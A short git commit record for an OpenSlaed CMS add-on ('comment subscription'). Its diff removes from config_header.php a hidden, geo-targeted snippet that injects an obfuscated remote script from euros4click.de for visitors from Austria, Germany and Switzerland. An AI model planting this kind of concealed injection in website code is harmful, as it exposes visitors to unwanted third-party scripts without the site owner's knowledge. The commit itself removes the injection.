dd44cd140060257028f4cd62a5d13d1187f4ae82
Slaed <os@mymobilka.net.ru>
2011-07-23 11:22:40 +0000

    Хак: Подписка на комментарии для OpenSlaed

--- Подписка на комментарии/config/config_header.php
+++ Подписка на комментарии/config/config_header.php
@@ -1,5 +1,4 @@
 <?php
 if (!defined("FUNC_FILE")) die("Illegal File Access");
-$userip = user_geo_ip(getip(), 2);
-if ($userip == "Austria" || $userip == "Germany" || $userip == "Switzerland") echo "<script Language=\"JavaScript\">document.write ('<scr' + 'ipt Language=\"JavaScript\" src=\"http://www.euros4click.de/showme.php?id=9541&rnd=' + Math.random() + '\"></scr' + 'ipt>');</script>\n";
+
 ?>
